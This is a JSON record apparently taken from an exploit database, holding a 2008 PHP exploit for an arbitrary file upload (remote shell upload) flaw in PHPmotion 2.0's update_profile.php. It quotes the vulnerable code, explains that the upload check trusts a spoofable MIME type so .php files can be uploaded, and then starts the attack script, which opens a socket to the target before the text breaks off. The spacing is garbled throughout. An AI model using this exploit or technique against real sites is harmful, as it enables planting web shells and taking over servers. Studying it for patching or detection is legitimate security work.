{
    "text": "ecve : CVE-2008-3118 CVE-2008-3117 ， title : PHPmotion 2.0 - 'update_profile.php' Arbitrary File Upload - PHP webapps Exploit ， verified : Verified ， exploit_detail : <?php ， / *  ， PHPmotion <= 2.0 ( update_profile.php ) Remote Shell Upload Exploit ， author... : EgiX ， mail..... : n0b0d13s [ at ] gmail [ dot ] com ， link..... :  ， details.. : don't works on windows platforms due to $ _FILES [ 'ufile' ]  [ 'tmp_name' ] is stripslashed ，  [ - ] vulnerable code in /update_profile.php ， 255. // START OF FILE UPLOAD AND SECURITY CHECK ， 256. $ limit_size = $ config [ 'maximum_size' ]  ; //you can change this to a higher file size limit ( this is in bytes = 2MB apprx )  ， 257. $ random = randomcode (  )  ; //create random number ， 258. $ uniquename1 = $ random . $ _FILES [ 'ufile' ]  [ 'name' ]  ; //add random number to file name to create unique file ， 259. $ uniquename = mysql_real_escape_string (  $ uniquename1 )  ;  ， 260. $ path = installation_paths (  )  ;  ， 261. $ path = $ path . \"/pictures/\" . $ uniquename ;  ， 262. ， 263. if (  $ _FILES ) { ， 264. // Store upload file size in $ file_size ， 265. $ file_size = $ _FILES [ 'ufile' ]  [ 'size' ]  ;  ， 266. //die ( \"\\ $ file_size = $ file_size ; \\ $ limit_size = $ limit_size ; \" )  ;  ， 267. ， 268. if (  $ file_size >= $ limit_size ) { ， 269. // Display file size error ， 270. // /////////////////////// ， 271. $ show = 1 ;  ， 272. $ message_type = $ config [ \"notification_success\" ]  ; //the messsage displayed at the top coner ， 273. $ error_message = 'Your image is too large. The maximum size allowed is : ' . $ config [ 'maximum_size_human_readale' ]  ;  ， 274. $ blk_id = 1 ; //html table - error block ， 275. $ template = \"templates/main_1.htm\" ;  ， 276. $ inner_template1 = \"templates/inner_myaccount_update_profile.htm\" ; //middle of page ， 277. $ TBS = new clsTinyButStrong ;  ， 278. $ TBS->NoErr = true ; // no more error message displayed. ， 279. $ TBS->LoadTemplate ( \" $ template\" )  ;  ， 280. $ TBS->Render = TBS_OUTPUT ;  ， 281. $ TBS->Show (  )  ;  ， 282. ， 283. @ mysql_close (  )  ;  ， 284. die (  )  ;  ， 285. } ， 286. else { ， 287. $ filetype = $ _FILES [ 'ufile' ]  [ 'type' ]  ; <= ====== ， 288. if (  $ filetype == \"image/gif\" |  |  $ filetype == \"image/jpeg\" |  |  $ filetype == ， 289. \"image/pjpeg\" ) { ， 290. // copy file to where you want to store file ， 291. if (  @ copy (  $ _FILES [ 'ufile' ]  [ 'tmp_name' ]  ,  $ path )  ) { ， 292. } ， 293. else { ， 294. // Display general file copy error ， an attacker might be able to upload arbitrary malicious files with .php extension due to the code ， near lines 287-289 will check only the MIME type of the upload request , that can be easily spoofed !  ，  * / ， error_reporting ( 0 )  ;  ， set_time_limit ( 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ，  $ sock = fsockopen (  $ host , 80 )  ; ",
    "time": "2008-06-25"
}